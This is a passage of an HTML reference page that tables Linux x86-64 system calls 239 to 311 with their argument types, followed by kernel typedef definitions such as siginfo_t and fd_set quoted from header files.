         <td>unsigned long maxnode</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>239</td>
         <td>sys_get_mempolicy</td>
         <td>int *policy</td>
         <td>unsigned long *nmask</td>
         <td>unsigned long maxnode</td>
         <td>unsigned long addr</td>
         <td>unsigned long flags</td>
         <td></td>
      </tr>
      <tr>
         <td>240</td>
         <td>sys_mq_open</td>
         <td>const char *u_name</td>
         <td>int oflag</td>
         <td>mode_t mode</td>
         <td>struct mq_attr *u_attr</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>241</td>
         <td>sys_mq_unlink</td>
         <td>const char *u_name</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>242</td>
         <td>sys_mq_timedsend</td>
         <td>mqd_t mqdes</td>
         <td>const char *u_msg_ptr</td>
         <td>size_t msg_len</td>
         <td>unsigned int msg_prio</td>
         <td>const stuct timespec *u_abs_timeout</td>
         <td></td>
      </tr>
      <tr>
         <td>243</td>
         <td>sys_mq_timedreceive</td>
         <td>mqd_t mqdes</td>
         <td>char *u_msg_ptr</td>
         <td>size_t msg_len</td>
         <td>unsigned int *u_msg_prio</td>
         <td>const struct timespec *u_abs_timeout</td>
         <td></td>
      </tr>
      <tr>
         <td>244</td>
         <td>sys_mq_notify</td>
         <td>mqd_t mqdes</td>
         <td>const struct sigevent *u_notification</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>245</td>
         <td>sys_mq_getsetattr</td>
         <td>mqd_t mqdes</td>
         <td>const struct mq_attr *u_mqstat</td>
         <td>struct mq_attr *u_omqstat</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>246</td>
         <td>sys_kexec_load</td>
         <td>unsigned long entry</td>
         <td>unsigned long nr_segments</td>
         <td>struct kexec_segment *segments</td>
         <td>unsigned long flags</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>247</td>
         <td>sys_waitid</td>
         <td>int which</td>
         <td>pid_t upid</td>
         <td>struct siginfo *infop</td>
         <td>int options</td>
         <td>struct rusage *ru</td>
         <td></td>
      </tr>
      <tr>
         <td>248</td>
         <td>sys_add_key</td>
         <td>const char *_type</td>
         <td>const char *_description</td>
         <td>const void *_payload</td>
         <td>size_t plen</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>249</td>
         <td>sys_request_key</td>
         <td>const char *_type</td>
         <td>const char *_description</td>
         <td>const char *_callout_info</td>
         <td>key_serial_t destringid</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>250</td>
         <td>sys_keyctl</td>
         <td>int option</td>
         <td>unsigned long arg2</td>
         <td>unsigned long arg3</td>
         <td>unsigned long arg4</td>
         <td>unsigned long arg5</td>
         <td></td>
      </tr>
      <tr>
         <td>251</td>
         <td>sys_ioprio_set</td>
         <td>int which</td>
         <td>int who</td>
         <td>int ioprio</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>252</td>
         <td>sys_ioprio_get</td>
         <td>int which</td>
         <td>int who</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>253</td>
         <td>sys_inotify_init</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>254</td>
         <td>sys_inotify_add_watch</td>
         <td>int fd</td>
         <td>const char *pathname</td>
         <td>u32 mask</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>255</td>
         <td>sys_inotify_rm_watch</td>
         <td>int fd</td>
         <td>__s32 wd</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>256</td>
         <td>sys_migrate_pages</td>
         <td>pid_t pid</td>
         <td>unsigned long maxnode</td>
         <td>const unsigned long *old_nodes</td>
         <td>const unsigned long *new_nodes</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>257</td>
         <td>sys_openat</td>
         <td>int dfd</td>
         <td>const char *filename</td>
         <td>int flags</td>
         <td>int mode</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>258</td>
         <td>sys_mkdirat</td>
         <td>int dfd</td>
         <td>const char *pathname</td>
         <td>int mode</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>259</td>
         <td>sys_mknodat</td>
         <td>int dfd</td>
         <td>const char *filename</td>
         <td>int mode</td>
         <td>unsigned dev</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>260</td>
         <td>sys_fchownat</td>
         <td>int dfd</td>
         <td>const char *filename</td>
         <td>uid_t user</td>
         <td>gid_t group</td>
         <td>int flag</td>
         <td></td>
      </tr>
      <tr>
         <td>261</td>
         <td>sys_futimesat</td>
         <td>int dfd</td>
         <td>const char *filename</td>
         <td>struct timeval *utimes</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>262</td>
         <td>sys_newfstatat</td>
         <td>int dfd</td>
         <td>const char *filename</td>
         <td>struct stat *statbuf</td>
         <td>int flag</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>263</td>
         <td>sys_unlinkat</td>
         <td>int dfd</td>
         <td>const char *pathname</td>
         <td>int flag</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>264</td>
         <td>sys_renameat</td>
         <td>int oldfd</td>
         <td>const char *oldname</td>
         <td>int newfd</td>
         <td>const char *newname</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>265</td>
         <td>sys_linkat</td>
         <td>int oldfd</td>
         <td>const char *oldname</td>
         <td>int newfd</td>
         <td>const char *newname</td>
         <td>int flags</td>
         <td></td>
      </tr>
      <tr>
         <td>266</td>
         <td>sys_symlinkat</td>
         <td>const char *oldname</td>
         <td>int newfd</td>
         <td>const char *newname</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>267</td>
         <td>sys_readlinkat</td>
         <td>int dfd</td>
         <td>const char *pathname</td>
         <td>char *buf</td>
         <td>int bufsiz</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>268</td>
         <td>sys_fchmodat</td>
         <td>int dfd</td>
         <td>const char *filename</td>
         <td>mode_t mode</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>269</td>
         <td>sys_faccessat</td>
         <td>int dfd</td>
         <td>const char *filename</td>
         <td>int mode</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>270</td>
         <td>sys_pselect6</td>
         <td>int n</td>
         <td>fd_set *inp</td>
         <td>fd_set *outp</td>
         <td>fd_set *exp</td>
         <td>struct timespec *tsp</td>
         <td>void *sig</td>
      </tr>
      <tr>
         <td>271</td>
         <td>sys_ppoll</td>
         <td>struct pollfd *ufds</td>
         <td>unsigned int nfds</td>
         <td>struct timespec *tsp</td>
         <td>const sigset_t *sigmask</td>
         <td>size_t sigsetsize</td>
         <td></td>
      </tr>
      <tr>
         <td>272</td>
         <td>sys_unshare</td>
         <td>unsigned long unshare_flags</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>273</td>
         <td>sys_set_robust_list</td>
         <td>struct robust_list_head *head</td>
         <td>size_t len</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>274</td>
         <td>sys_get_robust_list</td>
         <td>int pid</td>
         <td>struct robust_list_head **head_ptr</td>
         <td>size_t *len_ptr</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>275</td>
         <td>sys_splice</td>
         <td>int fd_in</td>
         <td>loff_t *off_in</td>
         <td>int fd_out</td>
         <td>loff_t *off_out</td>
         <td>size_t len</td>
         <td>unsigned int flags</td>
      </tr>
      <tr>
         <td>276</td>
         <td>sys_tee</td>
         <td>int fdin</td>
         <td>int fdout</td>
         <td>size_t len</td>
         <td>unsigned int flags</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>277</td>
         <td>sys_sync_file_range</td>
         <td>long fd</td>
         <td>loff_t offset</td>
         <td>loff_t bytes</td>
         <td>long flags</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>278</td>
         <td>sys_vmsplice</td>
         <td>int fd</td>
         <td>const struct iovec *iov</td>
         <td>unsigned long nr_segs</td>
         <td>unsigned int flags</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>279</td>
         <td>sys_move_pages</td>
         <td>pid_t pid</td>
         <td>unsigned long nr_pages</td>
         <td>const void **pages</td>
         <td>const int *nodes</td>
         <td>int *status</td>
         <td>int flags</td>
      </tr>
      <tr>
         <td>280</td>
         <td>sys_utimensat</td>
         <td>int dfd</td>
         <td>const char *filename</td>
         <td>struct timespec *utimes</td>
         <td>int flags</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>281</td>
         <td>sys_epoll_pwait</td>
         <td>int epfd</td>
         <td>struct epoll_event *events</td>
         <td>int maxevents</td>
         <td>int timeout</td>
         <td>const sigset_t *sigmask</td>
         <td>size_t sigsetsize</td>
      </tr>
      <tr>
         <td>282</td>
         <td>sys_signalfd</td>
         <td>int ufd</td>
         <td>sigset_t *user_mask</td>
         <td>size_t sizemask</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>283</td>
         <td>sys_timerfd_create</td>
         <td>int clockid</td>
         <td>int flags</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>284</td>
         <td>sys_eventfd</td>
         <td>unsigned int count</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>285</td>
         <td>sys_fallocate</td>
         <td>long fd</td>
         <td>long mode</td>
         <td>loff_t offset</td>
         <td>loff_t len</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>286</td>
         <td>sys_timerfd_settime</td>
         <td>int ufd</td>
         <td>int flags</td>
         <td>const struct itimerspec *utmr</td>
         <td>struct itimerspec *otmr</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>287</td>
         <td>sys_timerfd_gettime</td>
         <td>int ufd</td>
         <td>struct itimerspec *otmr</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>288</td>
         <td>sys_accept4</td>
         <td>int fd</td>
         <td>struct sockaddr *upeer_sockaddr</td>
         <td>int *upeer_addrlen</td>
         <td>int flags</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>289</td>
         <td>sys_signalfd4</td>
         <td>int ufd</td>
         <td>sigset_t *user_mask</td>
         <td>size_t sizemask</td>
         <td>int flags</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>290</td>
         <td>sys_eventfd2</td>
         <td>unsigned int count</td>
         <td>int flags</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>291</td>
         <td>sys_epoll_create1</td>
         <td>int flags</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>292</td>
         <td>sys_dup3</td>
         <td>unsigned int oldfd</td>
         <td>unsigned int newfd</td>
         <td>int flags</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>293</td>
         <td>sys_pipe2</td>
         <td>int *filedes</td>
         <td>int flags</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>294</td>
         <td>sys_inotify_init1</td>
         <td>int flags</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>295</td>
         <td>sys_preadv</td>
         <td>unsigned long fd</td>
         <td>const struct iovec *vec</td>
         <td>unsigned long vlen</td>
         <td>unsigned long pos_l</td>
         <td>unsigned long pos_h</td>
         <td></td>
      </tr>
      <tr>
         <td>296</td>
         <td>sys_pwritev</td>
         <td>unsigned long fd</td>
         <td>const struct iovec *vec</td>
         <td>unsigned long vlen</td>
         <td>unsigned long pos_l</td>
         <td>unsigned long pos_h</td>
         <td></td>
      </tr>
      <tr>
         <td>297</td>
         <td>sys_rt_tgsigqueueinfo</td>
         <td>pid_t tgid</td>
         <td>pid_t pid</td>
         <td>int sig</td>
         <td>siginfo_t *uinfo</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>298</td>
         <td>sys_perf_event_open</td>
         <td>struct perf_event_attr *attr_uptr</td>
         <td>pid_t pid</td>
         <td>int cpu</td>
         <td>int group_fd</td>
         <td>unsigned long flags</td>
         <td></td>
      </tr>
      <tr>
         <td>299</td>
         <td>sys_recvmmsg</td>
         <td>int fd</td>
         <td>struct msghdr *mmsg</td>
         <td>unsigned int vlen</td>
         <td>unsigned int flags</td>
         <td>struct timespec *timeout</td>
         <td></td>
      </tr>
      <tr>
         <td>300</td>
         <td>sys_fanotify_init</td>
         <td>unsigned int flags</td>
         <td>unsigned int event_f_flags</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>301</td>
         <td>sys_fanotify_mark</td>
         <td>long fanotify_fd</td>
         <td>long flags</td>
         <td>__u64 mask</td>
         <td>long dfd</td>
         <td>long pathname</td>
         <td></td>
      </tr>
      <tr>
         <td>302</td>
         <td>sys_prlimit64</td>
         <td>pid_t pid</td>
         <td>unsigned int resource</td>
         <td>const struct rlimit64 *new_rlim</td>
         <td>struct rlimit64 *old_rlim</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>303</td>
         <td>sys_name_to_handle_at</td>
         <td>int dfd</td>
         <td>const char *name</td>
         <td>struct file_handle *handle</td>
         <td>int *mnt_id</td>
         <td>int flag</td>
         <td></td>
      </tr>
      <tr>
         <td>304</td>
         <td>sys_open_by_handle_at</td>
         <td>int dfd</td>
         <td>const char *name</td>
         <td>struct file_handle *handle</td>
         <td>int *mnt_id</td>
         <td>int flags</td>
         <td></td>
      </tr>
      <tr>
         <td>305</td>
         <td>sys_clock_adjtime</td>
         <td>clockid_t which_clock</td>
         <td>struct timex *tx</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>306</td>
         <td>sys_syncfs</td>
         <td>int fd</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>307</td>
         <td>sys_sendmmsg</td>
         <td>int fd</td>
         <td>struct mmsghdr *mmsg</td>
         <td>unsigned int vlen</td>
         <td>unsigned int flags</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>308</td>
         <td>sys_setns</td>
         <td>int fd</td>
         <td>int nstype</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>309</td>
         <td>sys_getcpu</td>
         <td>unsigned *cpup</td>
         <td>unsigned *nodep</td>
         <td>struct getcpu_cache *unused</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>310</td>
         <td>sys_process_vm_readv</td>
         <td>pid_t pid</td>
         <td>const struct iovec *lvec</td>
         <td>unsigned long liovcnt</td>
         <td>const struct iovec *rvec</td>
         <td>unsigned long riovcnt</td>
         <td>unsigned long flags</td>
      </tr>
      <tr>
         <td>311</td>
         <td>sys_process_vm_writev</td>
         <td>pid_t pid</td>
         <td>const struct iovec *lvec</td>
         <td>unsigned long liovcnt</td>
         <td>const struct iovcc *rvec</td>
         <td>unsigned long riovcnt</td>
         <td>unsigned long flags</td>
      </tr>
    </tbody>
  </table>
<div class="col-md-6">
  <h1 id="typedefs">Typedefs</h1>
  <table id="typedef" class="table table-hover table-condensed table-inverted table-bordered table-striped">
   <thead>
      <tr>
         <th>Typedef</th>
         <th>Description</th>
      </tr>
   </thead>
   <tbody>
      <tr>
         <th valign="top"><a name="atomic_t" id=
            "atomic_t">atomic_t</a></th>
         <td><a href=
            "file:///usr/src/linux/include/asm/atomic.h">include/asm/atomic.h</a>:
            <br>
            #ifdef __SMP__
            <br>
            typedef struct { volatile int counter; } atomic_t;
            <br>
            #else
            <br>
            typedef struct { int counter; } atomic_t;
            <br>
            #endif
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="caddr_t" id=
            "caddr_t">caddr_t</a></th>
         <td><a href=
            "file:///usr/src/linux/include/asm/posix_types.h">include/asm/posix_types.h</a>:typedef
            char * __kernel_caddr_t;
            <br>
            <a href=
               "file:///usr/src/linux/include/linux/types.h">include/linux/types.h</a>:typedef
            __kernel_caddr_t caddr_t;
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="cap_user_header_t" id=
            "cap_user_header_t">cap_user_header_t</a></th>
         <td><a href=
            "file:///usr/src/linux/include/linux/capability.h">include/linux/capability.h</a>:
            <br>
            typedef struct __user_cap_header_struct {
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#__u32">__u32</a> version;
            <br>
            &#160;&#160;&#160;&#160;&#160;int pid;
            <br>
            } *cap_user_header_t;
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="cap_user_data_t" id=
            "cap_user_data_t">cap_user_data_t</a></th>
         <td><a href=
            "file:///usr/src/linux/include/linux/capability.h">include/linux/capability.h</a>:
            <br>
            typedef struct __user_cap_data_struct {
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#__u32">__u32</a> effective;
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#__u32">__u32</a> permitted;
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#__u32">__u32</a> inheritable;
            <br>
            } *cap_user_data_t;
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="clock_t" id=
            "clock_t">clock_t</a></th>
         <td><a href=
            "file:///usr/src/linux/include/asm/posix_types.h">include/asm/posix_types.h</a>:typedef
            long __kernel_clock_t;
            <br>
            <a href=
               "file:///usr/src/linux/include/linux/types.h">include/linux/types.h</a>:typedef
            __kernel_clock_t clock_t;
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="dev_t" id="dev_t">dev_t</a></th>
         <td><a href=
            "file:///usr/src/linux/include/asm/posix_types.h">include/asm/posix_types.h</a>:typedef
            unsigned short __kernel_dev_t;
            <br>
            <a href=
               "file:///usr/src/linux/include/linux/types.h">include/linux/types.h</a>:typedef
            __kernel_dev_t dev_t;
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="fdset" id="fdset">fdset</a></th>
         <td>include/linux/posix_types.h
            <br>
            #define __FD_SETSIZE 1024
            <br>
            #define __NFDBITS (8 * sizeof(unsigned long))
            <br>
            #define __FDSET_LONGS (__FD_SETSIZE/__NFDBITS)
            <br>
            (==&gt; __FDSET_LONGS == 32)
            <br>
            <br>
            typedef struct {
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long fds_bits
            [__FDSET_LONGS];
            <br>
            } __kernel_fd_set;
            <br>
            <a href=
               "file:///usr/src/linux/include/linux/types.h">include/linux/types.h</a>:typedef
            __kernel_fd_set fd_set;
            <br>
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="gid_t" id="gid_t">gid_t</a></th>
         <td><a href=
            "file:///usr/src/linux/include/asm/posix_types.h">include/asm/posix_types.h</a>:typedef
            unsigned short __kernel_gid_t;
            <br>
            <a href=
               "file:///usr/src/linux/include/linux/types.h">include/linux/types.h</a>:typedef
            __kernel_gid_t gid_t;
         </td>
      </tr>
      <tr>
         <th valign="top"><a name=
            "__kernel_daddr_t">__kernel_daddr_t</a></th>
         <td><a href=
            "file:///usr/src/linux/include/asm/posix_types.h">include/asm/posix_types.h</a>:typedef
            int __kernel_daddr_t;
            <br>
         </td>
      </tr>
      <tr>
         <th valign="top"><a name=
            "__kernel_fsid_t">__kernel_fsid_t</a></th>
         <td><a href=
            "file:///usr/src/linux/include/asm/posix_types.h">include/asm/posix_types.h</a>:
            <br>
            typedef struct {
            <br>
            &#160;&#160;&#160;&#160;&#160;int __val[2];
            <br>
            } __kernel_fsid_t;
            <br>
            <br>
         </td>
      </tr>
      <tr>
         <th valign="top"><a name=
            "__kernel_ino_t">__kernel_ino_t</a></th>
         <td><a href=
            "file:///usr/src/linux/include/asm/posix_types.h">include/asm/posix_types.h</a>:typedef
            unsigned long __kernel_ino_t;
            <br>
         </td>
      </tr>
      <tr>
         <th valign="top"><a name=
            "__kernel_size_t">__kernel_size_t</a></th>
         <td><a href=
            "file:///usr/src/linux/include/asm/posix_types.h">include/asm/posix_types.h</a>:typedef
            unsigned int __kernel_size_t;
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="loff_t" id="loff_t">loff_t</a></th>
         <td><a href=
            "file:///usr/src/linux/include/asm/posix_types.h">include/asm/posix_types.h</a>:typedef
            long long __kernel_loff_t;
            <br>
            <a href=
               "file:///usr/src/linux/include/linux/types.h">include/linux/types.h</a>:typedef
            __kernel_loff_t loff_t;
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="mode_t" id="mode_t">mode_t</a></th>
         <td><a href=
            "file:///usr/src/linux/include/asm/posix_types.h">include/asm/posix_types.h</a>:typedef
            unsigned short __kernel_mode_t;
            <br>
            <a href=
               "file:///usr/src/linux/include/linux/types.h">include/linux/types.h</a>:typedef
            __kernel_mode_t mode_t;
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="off_t" id="off_t">off_t</a></th>
         <td><a href=
            "file:///usr/src/linux/include/asm/posix_types.h">include/asm/posix_types.h</a>:typedef
            long __kernel_off_t; <a href=
               "file:///usr/src/linux/include/linux/types.h">include/linux/types.h</a>:typedef
            __kernel_off_t off_t;
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="old_sigset_t" id=
            "old_sigset_t">old_sigset_t</a></th>
         <td><a href=
            "file:///usr/src/linux/include/asm/signal.h">include/asm/signal.h</a>:typedef
            unsigned long old_sigset_t;
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="pid_t" id="pid_t">pid_t</a></th>
         <td><a href=
            "file:///usr/src/linux/include/asm/posix_types.h">include/asm/posix_types.h</a>:typedef
            int __kernel_pid_t;
            <br>
            <a href=
               "file:///usr/src/linux/include/linux/types.h">include/linux/types.h</a>:typedef
            __kernel_pid_t pid_t;
         </td>
      </tr>
      <tr>
         <th valign="top"><a name=
            "__sighandler_t">__sighandler_t</a></th>
         <td><a href=
            "file:///usr/src/linux/include/asm/signal.h">include/asm/signal.h</a>:typedef
            void (*__sighandler_t)(int);
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="siginfo_t" id=
            "siginfo_t">siginfo_t</a></th>
         <td><a href=
            "file:///usr/src/linux/include/asm/siginfo.h">include/asm/siginfo.h</a>:
            <br>
            #define SI_MAX_SIZE 128
            <br>
            #define SI_PAD_SIZE ((SI_MAX_SIZE/sizeof(int)) - 3)
            <br>
            (==&gt; SI_PAD_SIZE == 29)
            <br>
            <br>
            typedef struct siginfo {
            <br>
            &#160;&#160;&#160;&#160;&#160;int si_signo;
            <br>
            &#160;&#160;&#160;&#160;&#160;int si_errno;
            <br>
            &#160;&#160;&#160;&#160;&#160;int si_code;
            <br>
            <br>
            &#160;&#160;&#160;&#160;&#160;union {
            <br>
            &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;int
            _pad[SI_PAD_SIZE];
            <br>
            <br>
            &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/*
            kill() */
            <br>
            &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;struct
            {
            <br>
            &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;<a href="#pid_t">pid_t</a>
            _pid; /* sender's pid */
            <br>
            &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;<a href="#uid_t">uid_t</a>
            _uid; /* sender's uid */
            <br>
            &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;}
            _kill;
            <br>
            <br>
            &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/*
            POSIX.1b timers */
            <br>
            &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;struct
            {
            <br>
            &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;unsigned
            int _timer1;
            <br>
            &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;unsigned
            int _timer2;
            <br>
            &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;}
            _timer;
            <br>
            <br>
            &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/*
            POSIX.1b signals */
            <br>
            &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;struct
            {
            <br>
            &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;<a href="#pid_t">pid_t</a>
            _pid; /* sender's pid */
            <br>
            &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;<a href="#uid_t">uid_t</a>
            _uid; /* sender's uid */
            <br>
            &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sigval_t
            _sigval;
            <br>
            &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;}
            _rt;
            <br>
            <br>
            &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/*
            SIGCHLD */
            <br>
            &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;struct
            {
            <br>
            &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;<a href="#pid_t">pid_t</a>
            _pid; /* which child */
            <br>
            &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;<a href="#uid_t">uid_t</a>
            _uid; /* sender's uid */
            <br>
            &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;int
            _status; /* exit code */
            <br>
            &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;<a href="#clock_t">clock_t</a>
            _utime;
            <br>
            &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;<a href="#clock_t">clock_t</a>
            _stime;
            <br>
            &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;}
            _sigchld;
            <br>
            <br>
            &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/*
            SIGILL, SIGFPE, SIGSEGV, SIGBUS */
            <br>
            &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;struct
            {
            <br>
            &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;void
            *_addr; /* faulting insn/memory ref. */
            <br>
            &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;}
            _sigfault;
            <br>
            <br>
            &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/*
            SIGPOLL */
            <br>
            &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;struct
            {
            <br>
            &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;int
            _band; /* POLL_IN, POLL_OUT, POLL_MSG */
            <br>
            &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;int
            _fd;
            <br>
            &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;}
            _sigpoll;
            <br>
            &#160;&#160;&#160;&#160;&#160;} _sifields;
            <br>
            } siginfo_t;
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="sigset_t" id=
            "sigset_t">sigset_t</a></th>
         <td><a href=
            "file:///usr/src/linux/include/asm/signal.h">include/asm/signal.h</a>:typedef
            unsigned long sigset_t;
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="size_t" id="size_t">size_t</a></th>
         <td><a href=
            "file:///usr/src/linux/include/asm/posix_types.h">include/asm/posix_types.h</a>:typedef
            unsigned int __kernel_size_t;
            <br>
            <a href=
               "file:///usr/src/linux/include/linux/types.h">include/linux/types.h</a>:typedef
            __kernel_size_t size_t;
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="ssize_t" id=
            "ssize_t">ssize_t</a></th>
         <td><a href=
            "file:///usr/src/linux/include/asm/posix_types.h">include/asm/posix_types.h</a>:typedef
            int __kernel_ssize_t;
            <br>
            <a href=
               "file:///usr/src/linux/include/linux/types.h">include/linux/types.h</a>:typedef
            __kernel_ssize_t ssize_t;
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="stack_t" id=
            "stack_t">stack_t</a></th>
         <td><a href=
            "file:///usr/src/linux/include/asm/signal.h">include/asm/signal.h</a>:
            <br>
            typedef struct sigaltstack {
            <br>
            &#160;&#160;&#160;&#160;&#160;void *ss_sp;
            <br>
            &#160;&#160;&#160;&#160;&#160;int ss_flags;
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#size_t">size_t</a> ss_size;
            <br>
            } stack_t;
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="suseconds_t" id=
            "suseconds_t">suseconds_t</a></th>
         <td><a href=
            "file:///usr/src/linux/include/asm/posix_types.h">include/asm/posix_types.h</a>:typedef
            long __kernel_suseconds_t;
            <br>
